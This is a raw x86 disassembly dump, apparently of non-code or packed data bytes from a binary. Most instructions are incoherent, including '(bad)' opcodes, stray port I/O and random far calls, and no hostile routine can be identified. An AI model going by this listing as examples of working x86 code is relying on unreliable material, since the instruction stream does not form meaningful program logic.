  47a94c:	jge    0x47a9b8
  47a94e:	shr    ch,cl
  47a950:	adc    eax,0x7fd63bc8
  47a955:	add    edx,DWORD PTR [esi+0x4e]
  47a958:	cmp    eax,esi
  47a95a:	out    dx,al
  47a95b:	xlat   BYTE PTR ds:[ebx]
  47a95c:	retf   
  47a95d:	call   0x6cd2b250
  47a962:	gs retf 
  47a964:	xor    dh,BYTE PTR [ebx]
  47a966:	lods   eax,DWORD PTR ds:[esi]
  47a967:	jmp    0x47a9a2
  47a969:	out    dx,eax
  47a96a:	xlat   BYTE PTR ds:[ebx]
  47a96b:	fisubr DWORD PTR [ebp+0x320158e8]
  47a971:	mov    BYTE PTR [esi-0x66],cl
  47a974:	jmp    0x47a97b
  47a976:	test   al,0x82
  47a978:	push   ss
  47a979:	mov    eax,0xef1c660c
  47a97e:	loopne 0x47a9ee
  47a980:	(bad)  
  47a981:	std    
  47a982:	xor    dh,al
  47a984:	shl    BYTE PTR [ebx-0x18],0x94
  47a988:	sbb    DWORD PTR [ebp+0x1],eax
  47a98b:	or     al,0xf0
  47a98d:	pop    ebp
  47a98e:	icebp  
  47a98f:	and    eax,0x6c9d3d84
  47a994:	mov    al,ds:0xea9ac0cb
  47a999:	add    edi,ecx
  47a99b:	add    dh,al
  47a99d:	daa    
  47a99e:	inc    edi
  47a99f:	pop    eax
  47a9a0:	add    BYTE PTR [eax-0x28],bh
  47a9a3:	dec    ebx
  47a9a4:	ja     0x47a9aa
  47a9a6:	repnz aaa 
  47a9a8:	into   
  47a9a9:	retf   0xa758
  47a9ac:	xor    DWORD PTR [edx],esi
  47a9ae:	dec    ebx
  47a9af:	fdiv   QWORD PTR [eax-0x2e]
  47a9b2:	call   0x42f9:0x129d2941
  47a9b9:	or     bh,BYTE PTR [eax-0x50c74f70]
  47a9bf:	add    eax,0x8e160a67
  47a9c4:	cld    
  47a9c5:	dec    edi
  47a9c6:	les    ecx,FWORD PTR [edx-0x35]
  47a9c9:	sub    ebx,DWORD PTR ds:0xf6186693
  47a9cf:	xchg   esp,eax
  47a9d0:	hlt    
  47a9d1:	pusha  
  47a9d2:	or     DWORD PTR ds:0xa4ff040,ebx
  47a9d8:	nop
  47a9d9:	in     al,0x0
  47a9db:	cmp    al,0x24
  47a9dd:	and    BYTE PTR [esi+0x4c],ah
  47a9e0:	cld    
  47a9e1:	xchg   esi,eax
  47a9e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47a9e3:	inc    eax
  47a9e4:	and    bh,ah
  47a9e6:	es mov bh,0xa5
  47a9e9:	scas   eax,DWORD PTR es:[edi]
  47a9ea:	inc    esi
  47a9eb:	sub    esi,DWORD PTR [edi+edi*1+0x17]
  47a9ef:	push   ss
  47a9f0:	adc    eax,DWORD PTR [esi+0x607d956e]
  47a9f6:	loop   0x47aa55
  47a9f8:	or     al,ah
  47a9fa:	nop
  47a9fb:	push   0x2a
  47a9fd:	pusha  
  47a9fe:	and    BYTE PTR [edx],bl
  47aa00:	pop    ss
  47aa01:	inc    eax
  47aa02:	sub    edx,DWORD PTR [edi+0xc]
  47aa05:	addr16 adc ebx,ebp
  47aa08:	or     al,bl
  47aa0a:	sbb    al,al
  47aa0c:	push   0xffffffda
  47aa0e:	inc    ebx
  47aa0f:	and    al,bl
  47aa11:	scas   eax,DWORD PTR es:[edi]
  47aa12:	aaa    
  47aa13:	xchg   ecx,eax
  47aa14:	nop
  47aa15:	xchg   BYTE PTR [edi+0x400d7087],ah
  47aa1b:	pushf  
  47aa1c:	ins    BYTE PTR es:[edi],dx
  47aa1d:	fisttp WORD PTR [ecx]
  47aa1f:	shr    ah,cl
  47aa21:	push   ecx
  47aa22:	jp     0x47aa2a
  47aa24:	pop    ecx
  47aa25:	(bad)  
  47aa26:	aas    
  47aa27:	and    DWORD PTR ds:0x3708472d,edi
  47aa2d:	sbb    bl,BYTE PTR [eax-0x5876aee0]
  47aa33:	adc    DWORD PTR [ecx],edx
  47aa35:	add    ebx,DWORD PTR [eax]
  47aa37:	je     0x47aa70
  47aa39:	xchg   DWORD PTR [edi+edi*1+0x777203e],esp
  47aa40:	pop    es
  47aa41:	xchg   edi,eax
  47aa42:	sub    al,al
  47aa44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47aa45:	mov    cs,WORD PTR [eax]
  47aa47:	mov    cl,0x90
  47aa49:	push   ds
  47aa4a:	or     al,bl
  47aa4c:	and    eax,DWORD PTR [esi-0x31]
  47aa4f:	add    al,bl
  47aa51:	or     ah,BYTE PTR [ebp+0x2ef755bf]
  47aa57:	push   0xe6897bb
  47aa5c:	sahf   
  47aa5d:	out    dx,eax
  47aa5e:	fstp   TBYTE PTR [edx-0x75]
  47aa61:	es mov bh,0x3b
  47aa64:	rcl    esi,1
  47aa66:	repnz xor eax,0xd3cd1b8a
  47aa6c:	jl     0x47aa2c
  47aa6e:	rol    dl,0xbb
  47aa71:	or     bh,al
  47aa73:	xchg   edi,eax
  47aa74:	sbb    al,0xb0
  47aa76:	add    DWORD PTR [ebx-0xfd6b9b],edx
  47aa7c:	sub    eax,0xa515f08c
  47aa81:	add    bh,0x1
  47aa84:	mov    WORD PTR [ecx+ebp*1-0x4aeb5f20],cs
  47aa8b:	push   eax
  47aa8c:	cwde   
  47aa8d:	push   cs
  47aa8e:	push   0xf88fad44
  47aa93:	ficomp DWORD PTR [edx-0x20]
  47aa96:	(bad)
  47aa9a:	xor    al,BYTE PTR [edi+0x30]
  47aa9d:	push   gs
  47aa9f:	pop    es
  47aaa0:	cmp    dl,BYTE PTR [edi]
  47aaa2:	xlat   BYTE PTR ds:[ebx]
  47aaa3:	(bad)  
  47aaa4:	jmp    0x47aae5
  47aaa6:	les    eax,FWORD PTR [edi-0x2f977b29]
  47aaac:	aas    
  47aaad:	sbb    al,0x77
  47aaaf:	push   eax
  47aab0:	hlt    
  47aab1:	adc    BYTE PTR [edi+esi*2+0x478de727],0x50
  47aab9:	int    0xc7
  47aabb:	mov    ebx,DWORD PTR [eax]
  47aabd:	add    eax,0xfd044f82
  47aac2:	pushf  
  47aac3:	adc    cl,BYTE PTR [edi-0x67]
  47aac6:	ja     0x47aa57
  47aac8:	test   al,0x8a
  47aaca:	or     eax,0xaac2fc5
  47aacf:	cmp    esi,DWORD PTR [edi+0x30]
  47aad2:	call   0x5bd6:0x7d674796
  47aad9:	push   edi
  47aada:	jae    0x47aaea
  47aadc:	stos   DWORD PTR es:[edi],eax
  47aadd:	mov    bl,0x3a
  47aadf:	inc    ecx
  47aae0:	ret    
  47aae1:	inc    esp
  47aae2:	mov    WORD PTR [eax-0xe],es
  47aae5:	xchg   ebx,eax
  47aae6:	pop    ebx
  47aae7:	out    0x23,eax
  47aae9:	dec    ecx
  47aaea:	jae    0x47ab07
  47aaec:	aaa    
  47aaed:	dec    esp
  47aaee:	dec    eax
  47aaef:	xor    esi,eax
  47aaf1:	mov    cl,0xb0
  47aaf3:	(bad)  
  47aaf4:	cmp    eax,DWORD PTR ds:[ebx+0x40]
  47aaf8:	and    BYTE PTR [esi+0x2a],ah
  47aafb:	mov    ah,0xdb
  47aafd:	or     al,0xe
  47aaff:	inc    esp
  47ab00:	je     0x47ab3c
  47ab02:	dec    esi
  47ab03:	push   eax
  47ab04:	pop    es
  47ab05:	sbb    al,0x35
  47ab07:	jo     0x47ab5c
  47ab09:	push   ecx
  47ab0a:	std    
  47ab0b:	xlat   BYTE PTR ds:[ebx]
  47ab0c:	sub    dh,cl
  47ab0e:	iret   
  47ab0f:	mov    esp,0x12100c2a
  47ab14:	out    0x6c,eax
  47ab16:	mov    DWORD PTR [eax-0x77],ebp
  47ab19:	sbb    DWORD PTR [eax+eax*1+0x30],ebx
  47ab1d:	mov    DWORD PTR ds:0x2ddac3a4,esp
  47ab23:	xchg   DWORD PTR [edx+0x1661983a],edi
  47ab29:	rcl    BYTE PTR [ecx],1
  47ab2b:	loop   0x47ab59
  47ab2d:	push   es
  47ab2e:	push   cs
  47ab2f:	and    DWORD PTR [esp+ecx*1+0x50],edx
  47ab33:	lea    esp,[ecx-0x607393cf]
  47ab39:	xlat   BYTE PTR ds:[ebx]
  47ab3a:	es pusha 
  47ab3c:	fcom   QWORD PTR [ebx]
  47ab3e:	(bad)  
  47ab3f:	mov    ebp,0x3bcbd31a
  47ab44:	call   0x10bfbcbe
  47ab49:	and    eax,0x68ffc88
  47ab4e:	jg     0x47ab3b
  47ab50:	add    al,0x43
  47ab52:	dec    esi
  47ab53:	jne    0x47ab32
  47ab55:	mov    ah,0xc2
  47ab57:	xchg   edx,eax
  47ab58:	loope  0x47ab69
  47ab5a:	xor    BYTE PTR [ecx-0x3a],dh
  47ab5d:	push   0xca6d4d89
  47ab62:	pop    ds
  47ab63:	(bad)  
  47ab64:	adc    ecx,DWORD PTR ds:0xb5272ad4
  47ab6a:	or     al,0x26
  47ab6c:	leave  
  47ab6d:	add    DWORD PTR [edx+0x488988a],0x44617651
  47ab77:	add    edi,0x1b107e64
  47ab7d:	in     al,dx
  47ab7e:	and    BYTE PTR [eax+0x2b],0x50
  47ab82:	adc    ch,BYTE PTR [eax-0x2eddd6f3]
  47ab88:	iret   
  47ab89:	dec    edi
  47ab8a:	and    DWORD PTR [eax-0x36ccf863],eax
  47ab90:	pop    edx
  47ab91:	test   al,0x31
  47ab93:	(bad)  
  47ab94:	fild   QWORD PTR [ebx+eiz*8+0x64]
  47ab98:	mov    DWORD PTR [ecx],esp
  47ab9a:	push   esi
  47ab9b:	btc    DWORD PTR [ecx],ecx
  47ab9e:	add    BYTE PTR [ebx],al
  47aba0:	adc    dh,0x63
  47aba3:	add    eax,ebx
  47aba5:	xchg   ebp,eax
  47aba6:	xor    DWORD PTR [eax+0x4d],ecx
  47aba9:	adc    BYTE PTR [edx+0x5b],bl
  47abac:	xor    esi,DWORD PTR [esi]
  47abae:	aad    0x83
  47abb0:	jge    0x47ab70
  47abb2:	add    eax,0x4289146e
  47abb7:	stc    
  47abb8:	(bad)  
  47abb9:	cs sbb eax,0xde5f40f
  47abc0:	jne    0x1948898f
  47abc6:	call   0xfc94:0xcfcfd787
  47abcd:	and    BYTE PTR [ecx+0x3010310],bl
  47abd3:	and    BYTE PTR [edx+eax*8+0x5d478819],0x14
  47abdb:	(bad)  
  47abdc:	adc    esp,DWORD PTR cs:[esi]
  47abdf:	pop    ds
  47abe0:	ds push edx
  47abe2:	test   eax,0x2383d89e
  47abe7:	and    ch,ch
  47abe9:	sti    
  47abea:	add    bh,BYTE PTR [esi-0x22]
  47abed:	add    DWORD PTR [edx+0x42],eax
  47abf0:	(bad)  
  47abf1:	or     ch,BYTE PTR [ecx-0x76c9343f]
  47abf7:	test   BYTE PTR [ecx-0x9],al
  47abfa:	xchg   ebx,eax
  47abfb:	in     eax,dx
  47abfc:	push   cs
  47abfd:	or     al,0x6c
  47abff:	dec    esi
  47ac00:	add    eax,0xfc3402e6
  47ac05:	add    eax,0x49e00009
  47ac0a:	arpl   WORD PTR [eax+0x59],ax
  47ac0d:	xchg   ecx,eax
  47ac0e:	pop    eax
  47ac0f:	sbb    dh,dl
  47ac11:	pop    ebp
  47ac12:	xlat   BYTE PTR ds:[ebx]
  47ac13:	pop    ebp
  47ac14:	sti    
  47ac15:	mov    ch,0xeb
  47ac17:	add    BYTE PTR [eax+0x7d],bh
  47ac1a:	in     eax,0x96
  47ac1c:	sub    DWORD PTR [eax+eiz*4+0x7e],edx
  47ac20:	imul   ebx,ecx,0x12
  47ac23:	cmp    edx,DWORD PTR [ebp+0x10]
  47ac26:	jne    0x47ac2b
  47ac28:	push   0x2a
  47ac2a:	cmp    BYTE PTR [ebp-0x34fa55cc],bl
  47ac30:	or     al,0xa3
  47ac32:	add    edi,ecx
  47ac34:	(bad)  
  47ac35:	inc    DWORD PTR [eax]
  47ac37:	or     al,0x87
  47ac39:	rol    bh,cl
  47ac3b:	push   edx
  47ac3c:	test   al,0x47
  47ac3e:	(bad)  
  47ac3f:	dec    ebx
  47ac40:	and    al,dh
  47ac42:	sbb    eax,0xc38e4790
  47ac47:	stos   DWORD PTR es:[edi],eax
  47ac48:	mov    DWORD PTR [ebp-0x2e],0xa465f799
  47ac4f:	gs add cl,0xc
  47ac53:	loopne 0x47ac39
  47ac55:	push   edx
  47ac56:	push   cs
  47ac57:	inc    ebx
  47ac58:	cmp    bl,BYTE PTR [ebp-0x64]
  47ac5b:	retf   
  47ac5c:	test   al,0x7c
  47ac5e:	nop
  47ac5f:	pop    ds
  47ac60:	call   0x1047ac75
  47ac65:	hlt    
  47ac66:	add    BYTE PTR [eax],al
  47ac68:	adc    BYTE PTR [eax],dl
  47ac6a:	or     DWORD PTR [ecx-0x1674f695],ebp
  47ac70:	mov    dh,0x48
  47ac72:	inc    ebx
  47ac73:	mov    edx,0x6a8b75f8
  47ac78:	fwait
  47ac79:	das    
  47ac7a:	jg     0x47ac58
  47ac7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47ac7d:	daa    
  47ac7e:	xor    eax,0xbe070b65
  47ac83:	adc    eax,0xa42807d6
  47ac88:	hlt    
  47ac89:	jne    0x47ac81
  47ac8b:	jle    0xd607d241
  47ac91:	shr    edi,0xf4
  47ac94:	mov    edx,0xaecb061d
  47ac99:	pop    edi
  47ac9a:	mov    al,cs:0xb493f818
  47aca0:	cld    
  47aca1:	cmp    BYTE PTR [edi+0x6177df0],ah
  47aca7:	sub    esp,DWORD PTR [ebx-0x44f8c8ee]
  47acad:	rol    DWORD PTR ds:0xdca95455,0x1
  47acb4:	xchg   esp,eax
  47acb5:	adc    DWORD PTR [ebp-0x14],edx
  47acb8:	test   BYTE PTR [ebx+0x48],ch
  47acbb:	retf   0xd848
  47acbe:	fadd   QWORD PTR [eax+eax*8+0x3]
  47acc2:	das    
  47acc3:	mov    BYTE PTR [ebx-0x7d],dl
  47acc6:	or     al,0x75
  47acc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47acc9:	push   ebp
  47acca:	or     esp,esi
  47accc:	dec    esi
  47accd:	cld    
  47acce:	sahf   
  47accf:	fcomp  QWORD PTR [eax+eiz*8+0x27]
  47acd3:	jne    0x47ac92
  47acd5:	and    ah,0x53
  47acd8:	push   cs
  47acd9:	and    ah,BYTE PTR [eax+0x33]
  47acdc:	nop
  47acdd:	sbb    al,0x5a
  47acdf:	pop    es
  47ace0:	push   0xc763c1fc
  47ace5:	mov    gs,WORD PTR ds:0xf32b57a9
  47aceb:	movups xmm3,XMMWORD PTR [ecx]
  47acee:	ror    bh,cl
  47acf0:	jae    0x50d70afd
  47acf6:	jp     0x47ad21
  47acf8:	or     al,0x83
  47acfa:	packssdw mm2,QWORD PTR [edx+0x33]
  47acfe:	fadd   QWORD PTR [edi+0x2e141e1b]
  47ad04:	adc    eax,DWORD PTR [ebx]
  47ad06:	xchg   DWORD PTR [ecx+0x8928774],esi
  47ad0c:	(bad)  
  47ad0d:	sbb    ebx,DWORD PTR [ecx+esi*2+0x2a]
  47ad11:	int    0x48
  47ad13:	sbb    al,0x1c
  47ad15:	loopne 0x47acfb
  47ad17:	dec    esp
  47ad18:	cmp    bl,ch
  47ad1a:	rol    BYTE PTR [edi+0x19ec29e8],0x62
  47ad21:	mov    al,0x1c
  47ad23:	(bad)
  47ad26:	adc    DWORD PTR [esi],edi
  47ad28:	sahf   
  47ad29:	inc    ebx
  47ad2a:	sub    BYTE PTR [ebp-0x5435682f],cl
  47ad30:	or     al,0x8e
  47ad32:	fild   DWORD PTR [eax+0x40]
  47ad35:	call   FWORD PTR [eax]
  47ad37:	test   al,0x41
  47ad39:	fst    DWORD PTR [ebx]
  47ad3b:	(bad)  
  47ad3c:	pop    edx
  47ad3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47ad3e:	xchg   ebp,eax
  47ad3f:	fucomip st,st(3)
  47ad41:	hlt    
  47ad42:	mov    eax,0x171e2402
  47ad47:	add    DWORD PTR [eax],eax
  47ad49:	sbb    BYTE PTR [eax+0x372428e1],ch
  47ad4f:	fdivr  DWORD PTR [ebp-0x15]
  47ad52:	daa    
  47ad53:	fldcw  WORD PTR [ecx+0x6b3df63c]
  47ad59:	lods   al,BYTE PTR ds:[esi]
  47ad5a:	je     0x47ad95
  47ad5c:	mov    DWORD PTR [ebx+0x4],0x3a8e0416
  47ad63:	test   DWORD PTR [edi+0x3b],0x846e97e
  47ad6a:	sub    DWORD PTR [esi],ebp
  47ad6c:	mov    ebp,0x5b3a1809
  47ad71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47ad72:	push   edx
  47ad73:	sbb    al,0x20
  47ad75:	and    al,0x62
  47ad77:	sub    al,0x1
  47ad79:	mov    esp,0x6b22e49a
  47ad7e:	mov    esi,0x580c37c6
  47ad83:	bound  esi,QWORD PTR fs:[ecx-0x513f24ac]
  47ad8a:	xor    dl,bl
  47ad8c:	adc    eax,0xa47f2037
  47ad91:	rol    DWORD PTR [edi-0x3b],1
  47ad94:	icebp  
  47ad95:	lods   al,BYTE PTR ds:[esi]
  47ad96:	add    DWORD PTR [esi-0x6f],edx
  47ad99:	or     DWORD PTR [ebx-0x49],0xc0c8c0d1
  47ada0:	dec    edx
  47ada1:	mov    eax,0x2d87256d
  47ada6:	clc    
  47ada7:	lods   al,BYTE PTR ds:[esi]
  47ada8:	and    ebx,DWORD PTR [eax-0x4]
  47adab:	sub    edi,0x2938b7d8
  47adb1:	push   0x1c031bf
  47adb6:	test   eax,0x145a40ba
  47adbb:	sub    edx,DWORD PTR [eax+0x3]
  47adbe:	pop    esi
  47adbf:	add    al,0x84
  47adc1:	inc    ecx
  47adc2:	add    al,0xff
  47adc4:	adc    DWORD PTR [edx+0x4a740858],esp
  47adca:	fbstp  TBYTE PTR [edi]
  47adcc:	cld    
  47adcd:	sub    esi,ebp
  47adcf:	ret    
  47add0:	sub    BYTE PTR [eax],bh
  47add2:	push   di
  47add4:	lea    ebx,[ebp-0xc]
  47add7:	mov    esi,0x5b2fea84
  47addc:	(bad)  
  47addd:	pop    eax
  47adde:	add    BYTE PTR ds:[edi],ch
  47ade1:	push   0x40
  47ade3:	push   edx
  47ade4:	bound  edi,QWORD PTR ds:0x9a09d367
  47adea:	pop    edi
  47adeb:	fcom   QWORD PTR [ecx+0x1550500e]
  47adf1:	or     BYTE PTR [esi-0x26],0x45
  47adf5:	clc    
  47adf6:	lea    edx,[edx+eiz*1+0x10]
  47adfa:	aaa    
  47adfb:	mov    eax,0xfd1646c
  47ae00:	out    dx,al
  47ae01:	jecxz  0x47ae49
  47ae03:	push   ecx
  47ae04:	mov    edx,0xbc67ad10
  47ae09:	adc    bl,BYTE PTR [ebp-0x20fe89d4]
  47ae0f:	pop    esi
  47ae10:	mov    bh,0x42
  47ae12:	push   es
  47ae13:	and    DWORD PTR [edx],ecx
  47ae15:	cwde   
  47ae16:	add    eax,esi
  47ae18:	lods   al,BYTE PTR ds:[esi]
  47ae19:	ss mov bl,0xcc
  47ae1c:	dec    esp
  47ae1d:	outs   dx,DWORD PTR ds:[esi]
  47ae1e:	adc    al,0x3f
  47ae20:	adc    edi,DWORD PTR [ecx+eax*1]
  47ae23:	xor    eax,0xbc2a3adf
  47ae28:	push   ss
  47ae29:	jo     0x47ae30
  47ae2b:	or     al,0x89
  47ae2d:	push   es
  47ae2e:	add    DWORD PTR [ebx],0xd
  47ae31:	sub    esp,DWORD PTR [esi+esi*2]
  47ae34:	outs   dx,DWORD PTR ds:[esi]
  47ae35:	mov    ebx,0xffc3d42
  47ae3a:	mov    ds:0xa356cf7c,al
  47ae3f:	fisttp DWORD PTR [ebx-0x6ca608fa]
  47ae45:	repz sbb eax,0x4c059e83
  47ae4b:	or     al,0x55
  47ae4d:	or     BYTE PTR [ebp-0x57],ah
  47ae50:	(bad)  
  47ae51:	daa    
  47ae52:	or     BYTE PTR [eax-0x3e619df7],ah
  47ae58:	mov    ds:0x1f90d91b,eax
  47ae5d:	adc    eax,0x1aa33c93
  47ae62:	call   0x5054:0x260fe0da
  47ae69:	push   eax
  47ae6a:	jbe    0x47aea5
  47ae6c:	jge    0x47ae40
  47ae6e:	xor    DWORD PTR [ecx-0x287cb649],0xffffffb4
  47ae75:	mov    cl,0x80
  47ae77:	jle    0x47ae91
  47ae79:	and    BYTE PTR [ebp+0x27],bl
  47ae7c:	sbb    DWORD PTR [eax+edx*1+0x6c8c2103],edx
  47ae83:	cld    
  47ae84:	pop    ecx
  47ae85:	cwde   
  47ae86:	cmp    eax,0xfffffff8
  47ae89:	les    esp,FWORD PTR [esi-0x45554076]
  47ae8f:	int3   
  47ae90:	push   0x74ea3b94
  47ae95:	pop    ds
  47ae96:	pop    ds
  47ae97:	aam    0xf6
  47ae99:	xchg   BYTE PTR [eax+0x45],al
  47ae9c:	pop    ebp
  47ae9d:	mov    ds,WORD PTR [eax]
  47ae9f:	js     0x47aef9
  47aea1:	jg     0x47ae79
  47aea3:	push   0xe05b2970
  47aea8:	push   0x965b88c8
  47aead:	pop    ax
  47aeaf:	add    edx,DWORD PTR [edi+0xe]
  47aeb2:	mov    ecx,0x59caedc
  47aeb7:	mov    ecx,0xcb67e8a3
  47aebc:	mov    eax,ds:0x6fea1712
  47aec1:	loopne 0x47ae65
  47aec3:	jge    0x47aecb
  47aec5:	adc    al,0x92
  47aec7:	aad    0x3a
  47aec9:	pop    esp
  47aeca:	retf   
  47aecb:	pop    ds
  47aecc:	xor    al,0x56
  47aece:	cld    
  47aecf:	mov    al,0x2d
  47aed1:	push   eax
  47aed2:	mov    ch,0x77
  47aed4:	test   al,0x5a
  47aed6:	mov    ds:0x76719901,eax
  47aedb:	and    BYTE PTR [esi+0x37],bl
  47aede:	pop    edx
  47aedf:	enter  0xaa6,0x24
  47aee3:	sbb    al,0xdc
  47aee5:	adc    DWORD PTR [eax-0x10],ebx
  47aee8:	mov    eax,0x808a031
  47aeed:	gs pop es
  47aeef:	pusha  
  47aef0:	data16 sahf 
  47aef2:	add    al,0x78
  47aef4:	push   cs
  47aef5:	cmp    DWORD PTR [ecx],esp
  47aef7:	aas    
  47aef8:	mov    al,0xaf
  47aefa:	push   esp
  47aefb:	jge    0x47ae8a
  47aefd:	cmp    eax,0x38
  47af00:	sbb    eax,0x16b52143
  47af05:	dec    esp
  47af06:	hlt    
  47af07:	sbb    al,0x9c
  47af09:	cwde   
  47af0a:	pop    esi
  47af0b:	pusha  
  47af0c:	cmp    edi,DWORD PTR [eax+0xdf11840]
  47af12:	xlat   BYTE PTR ds:[ebx]
  47af13:	ss aaa 
  47af15:	in     al,dx
  47af16:	addr16 out dx,al
  47af18:	pop    ebx
  47af19:	lea    eax,[eax+0x5cb81f0c]
  47af1f:	xor    edi,DWORD PTR [eax-0x1d201b89]
  47af25:	sub    esp,DWORD PTR [ebp-0x48]
  47af28:	or     dl,bl
  47af2a:	cmp    cl,BYTE PTR [ecx+0xc]
  47af2d:	mov    eax,0xb5226468
  47af32:	not    dh
  47af34:	nop
  47af35:	xor    BYTE PTR [eax+0x59],ah
  47af38:	aad    0x92
  47af3a:	inc    ebx
  47af3b:	or     BYTE PTR [ebp+0xeafafb7],cl
  47af41:	jns    0x47af6f
  47af43:	and    cl,dh
  47af45:	inc    ebp
  47af46:	mov    al,0x54
  47af48:	sbb    bh,BYTE PTR [edx]
  47af4a:	(bad)  
  47af4b:	push   ebp
  47af4c:	popa   
  47af4d:	cdq    
  47af4e:	js     0x47af1b
  47af50:	add    al,0x2d
  47af52:	add    BYTE PTR [edi-0x3d81cfa4],ch
  47af58:	cmp    al,0x8b
  47af5a:	ror    BYTE PTR [esi],1
  47af5c:	cli    
  47af5d:	mov    ?,ebp
  47af5f:	cmp    BYTE PTR [ebx-0x3b3c2b16],al
  47af65:	cmp    al,0x4
  47af67:	cs shl esp,cl
  47af6a:	xchg   edi,eax
  47af6b:	iret   
  47af6c:	loopne 0x47af90
  47af6e:	mov    fs:0x1e78205d,eax
  47af74:	xor    eax,eax
  47af76:	mov    ds:0x18458858,eax
  47af7b:	test   ch,dl
  47af7d:	lahf   
  47af7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47af7f:	xor    eax,DWORD PTR [edi+0x72]
  47af82:	dec    esp
  47af83:	mov    al,0x72
  47af85:	(bad)  
  47af87:	in     al,0xe4
  47af89:	in     al,0xe4
  47af8b:	je     0x47b002
  47af8d:	jbe    0x47b006
  47af8f:	in     al,0xe4
  47af91:	in     al,0xe4
  47af93:	js     0x47b00e
  47af95:	jp     0x47b012
  47af97:	in     al,0xe4
  47af99:	in     al,0xe4
  47af9b:	jl     0x47b01a
  47af9d:	jle    0x47b01e
  47af9f:	in     al,0xe4
  47afa1:	in     al,0xe4
  47afa3:	pusha  
  47afa4:	popa   
  47afa5:	bound  esp,QWORD PTR [ebx-0x1c]
  47afa8:	in     al,0xe4
  47afaa:	in     al,0x64
  47afac:	gs data16 addr16 in al,0xe4
  47afb1:	in     al,0xe4
  47afb3:	push   0xe46b6a69
  47afb8:	in     al,0xe4
  47afba:	in     al,0x6c
  47afbc:	ins    DWORD PTR es:[edi],dx
  47afbd:	outs   dx,BYTE PTR ds:[esi]
  47afbe:	outs   dx,DWORD PTR ds:[esi]
  47afbf:	in     al,0xe4
  47afc1:	in     al,0xe4
  47afc3:	push   eax
  47afc4:	push   ecx
  47afc5:	push   edx
  47afc6:	push   ebx
  47afc7:	in     al,0xe4
  47afc9:	in     al,0xe4
  47afcb:	push   esp
  47afcc:	push   ebp
  47afcd:	push   esi
  47afce:	push   edi
  47afcf:	in     al,0xe4
  47afd1:	in     al,0xe4
  47afd3:	pop    eax
  47afd4:	pop    ecx
  47afd5:	pop    edx
  47afd6:	pop    ebx
  47afd7:	in     al,0xe4
  47afd9:	in     al,0xe4
  47afdb:	pop    esp
  47afdc:	pop    ebp
  47afdd:	pop    esi
  47afde:	pop    edi
  47afdf:	in     al,0xe4
  47afe1:	in     al,0xe4
  47afe3:	inc    eax
  47afe4:	inc    ecx
  47afe5:	inc    edx
  47afe6:	inc    ebx
  47afe7:	in     al,0xe4
  47afe9:	in     al,0xe4
  47afeb:	inc    esp
  47afec:	inc    ebp
  47afed:	inc    esi
  47afee:	inc    edi
  47afef:	in     al,0xe4
  47aff1:	in     al,0xe4
  47aff3:	dec    eax
  47aff4:	dec    ecx
  47aff5:	dec    edx
  47aff6:	dec    ebx
  47aff7:	in     al,0xe4
  47aff9:	in     al,0xe4
  47affb:	dec    esp
  47affc:	dec    ebp
  47affd:	dec    esi
  47affe:	dec    edi
  47afff:	adc    bh,ah
  47b001:	in     al,0xe4
  47b003:	xor    BYTE PTR [ecx],dh
  47b005:	xor    dl,BYTE PTR [edi+0x276a721c]
  47b00b:	jge    0x47afbf
  47b00d:	mov    BYTE PTR [edx+eax*8-0x4d6f46a9],al
  47b014:	mov    BYTE PTR [esi+ebp*1+0x229c0601],dl
  47b01b:	mov    al,0x89
  47b01d:	xchg   esi,eax
  47b01e:	ins    BYTE PTR es:[edi],dx
  47b01f:	outs   dx,DWORD PTR ds:[esi]
  47b020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47b021:	add    BYTE PTR [ecx+0x44],dh
  47b024:	popa   
  47b025:	(bad)  
  47b026:	mov    dl,0x1c
  47b028:	cmp    DWORD PTR [eax+ebp*1],0xfb2f4e7
  47b02f:	add    BYTE PTR [eax-0x27],dl
  47b032:	call   0xe4e:0xed139042
  47b039:	arpl   WORD PTR [eax-0x4d],dx
  47b03c:	mov    bh,0x50
  47b03e:	mov    bl,0x0
  47b040:	mov    cl,0x90
  47b042:	sub    DWORD PTR [eax],ebx
  47b044:	aaa    
  47b045:	mov    BYTE PTR [edi],al
  47b047:	popa   
  47b048:	lods   eax,DWORD PTR ds:[esi]
  47b049:	xchg   BYTE PTR [eax-0x4d],dh
  47b04c:	fcomip st,st(5)
  47b04e:	sbb    esp,esp
  47b050:	mov    edi,0x746e6f46
  47b055:	push   eax
  47b056:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x6609306c
  47b05e:	jo     0x47affa
  47b060:	test   ch,ch
  47b062:	mov    dl,0x11
  47b064:	adc    ah,BYTE PTR [edi]
  47b066:	jne    0x47b075
  47b068:	ret    0x341f
  47b06b:	cbw    
  47b06d:	fbstp  TBYTE PTR [edi]
  47b06f:	xchg   edi,eax
  47b070:	lods   eax,DWORD PTR ds:[esi]
  47b071:	call   0xa86:0xb490739b
  47b078:	or     DWORD PTR [edi+edi*4+0x28],edi
  47b07c:	sub    al,0x6e
  47b07e:	nop
  47b07f:	les    ebx,FWORD PTR [esi]
  47b081:	add    DWORD PTR [eax+eax*8],ecx
  47b084:	xlat   BYTE PTR ds:[ebx]
  47b085:	and    dh,BYTE PTR [eax+0x74657338]
  47b08b:	jl     0x47b067
  47b08d:	xor    DWORD PTR [ebx+0x53dfe0e7],ecx
  47b093:	je     0x47b10e
  47b095:	ins    BYTE PTR es:[edi],dx
  47b096:	loope  0x47b087
  47b098:	or     BYTE PTR [ecx+ebp*1-0x24],al
  47b09c:	xor    BYTE PTR [esi],al
  47b09e:	data16 jae 0x47b0e3
  47b0a1:	sub    al,0x7b
  47b0a3:	mov    al,0x99
  47b0a5:	enter  0xcb2,0x49
  47b0a9:	je     0x47b109
  47b0ab:	arpl   WORD PTR [ebx],cx
  47b0ad:	adc    BYTE PTR [edx],ah
  47b0af:	jo     0x47b04c
  47b0b1:	xor    eax,0x656e141b
  47b0b6:	push   ss
  47b0b7:	mov    WORD PTR [ecx],?
  47b0b9:	inc    eax
  47b0ba:	jl     0x47b082
  47b0bc:	imul   esp,DWORD PTR [ebp-0x12],0xfffffff5
  47b0c0:	int    0x9d
  47b0c2:	not    BYTE PTR [esi+0x46]
